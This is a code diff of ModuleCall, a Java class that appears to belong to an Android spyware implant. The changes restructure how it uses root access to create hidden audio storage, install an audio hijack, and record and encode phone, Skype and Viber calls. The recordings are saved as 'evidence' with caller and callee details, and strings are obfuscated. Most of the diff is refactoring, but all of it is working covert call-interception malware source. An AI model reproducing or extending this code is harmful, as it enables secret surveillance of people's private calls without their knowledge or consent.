@@ -140,38 +140,25 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
-		// Try to create the audio storage, at this point the sdcard might take
-		// a while to come up
-		boolean audioStorageOk = false;
+		if (Status.haveRoot()) {
+			AudioEncoder.deleteAudioStorage();
+			boolean audioStorageOk = AudioEncoder.createAudioStorage();
 
-		for (int i = 0; i < 5; i++) {
-			if (AudioEncoder.createAudioStorage() == true) {
-				audioStorageOk = true;
-				break;
-			}
+			if (audioStorageOk) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): starting audio storage management");
+					Execute.execute(new String[] { "touch", "/sdcard/1" });
+					Execute.executeRoot("touch /sdcard/2");
+				}
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): retrying to create the audio storage");
-			}
+				if (installHijack()) {
+					startWatchAudio();
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): unable to create audio storage");
+				}
 
-			Utils.sleep(1000);
-		}
-
-		if (audioStorageOk == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): unable to create audio storage");
-			}
-		}
-
-		if (Status.haveRoot() && audioStorageOk) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): starting audio storage management");
-				Execute.execute(new String[]{"touch", "/sdcard/1"});
-				Execute.executeRoot("touch /sdcard/2");
-			}
-
-			if (installHijack()) {
-				startWatchAudio();
 			}
 		}
 	}
@@ -314,7 +301,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	synchronized private boolean addToEncodingList(String s) {
-		if (s.contains(M.e("Qi-")) == false || (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {
+		if (s.contains(M.e("Qi-")) == false
+				|| (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
 			}
@@ -470,8 +458,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
-			//		+ " to: " + dateEnd + " incoming: " + incoming);
+			// Check.log(TAG + " (saveCallEvidence): " + currentRecordFile +
+			// " peer: " + peer + " from: " + dateBegin
+			// + " to: " + dateEnd + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
@@ -480,7 +469,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		AutoFile file = new AutoFile(currentRecordFile);
 		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
+				// Check.log(TAG + " (saveCallEvidence): file size = " +
+				// file.getSize());
 			}
 
 			int offset = 0;
@@ -488,7 +478,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				if (Cfg.DEBUG) {
-					//Check.log(TAG + " (saveCallEvidence): AMR header");
+					// Check.log(TAG + " (saveCallEvidence): AMR header");
 				}
 				offset = AMR_HEADER.length;
 			}
@@ -501,8 +491,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
-				//Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
+				// Check.log(TAG + " (saveCallEvidence), data len: " +
+				// data.length + " pos: " + pos);
+				// Check.log(TAG + " (saveCallEvidence), data[0:6]: " +
+				// ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
@@ -595,8 +587,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		additionalData.write(callee);
 
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
-			//Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
+			// Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s",
+			// caller.length, callee.length);
+			// Check.log(TAG + " getPosition: %s, len: %s ",
+			// additionalData.getPosition(), len);
 		}
 
 		if (Cfg.DEBUG) {
@@ -931,18 +925,19 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (encodeChunks): unknown call program");
 			}
-			
+
 			return;
 		}
-		
+
 		// Decide heuristics logic
 		boolean heur = true;
-		
+
 		if (!callInfo.heur && remote) { // Skype
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
+				Check.log(TAG
+						+ "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
-			
+
 			heur = false;
 		}
 
@@ -1003,10 +998,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				finished[remote ? 1 : 0] = true;
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]" );
+					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]");
 				}
-				// || callInfo.programId == 0x0148  
-				if ( (finished[0] && finished[1]) ) {
+				// || callInfo.programId == 0x0148
+				if ((finished[0] && finished[1])) {
 					// After encoding create the end of call marker
 					if (callInfo.delay) {
 						saveAllEvidences(chunks, begin, end);
@@ -1108,7 +1103,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			callInfo.processName = M.e("com.viber.voip");
 			callInfo.delay = true;
 			callInfo.heur = true;
-			
+
 			// open DB
 			callInfo.programId = 0x0148;
 			if (end) {
